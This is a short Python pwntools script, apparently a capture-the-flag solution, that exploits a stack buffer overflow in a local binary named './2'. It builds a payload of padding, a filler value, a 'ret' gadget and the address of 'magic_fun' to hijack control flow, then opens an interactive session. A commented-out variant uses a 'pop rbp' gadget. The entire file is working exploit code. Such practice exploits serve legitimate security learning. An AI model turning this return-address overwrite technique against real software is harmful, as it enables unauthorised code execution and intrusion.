from pwn import *

context(os='linux', arch='amd64', log_level='debug') #info

p = process('./2')
elf = ELF('./2')

ret_address = 0x40101a
pop_rbp_ret = 0x40115d

#gdb.attach(p)
#p.sendline(flat(
#    b'a' * 8,
#    0xdeadbeefdeadbeef,
#    pop_rbp_ret,
#    0x11111,
#   elf.sym['magic_fun'] #=0x401176
#))


payload  = b'a' * 8
payload += p64(0x121354684)
payload += p64(ret_address)
payload += p64(elf.sym['magic_fun'])

p.sendline(payload)

p.interactive()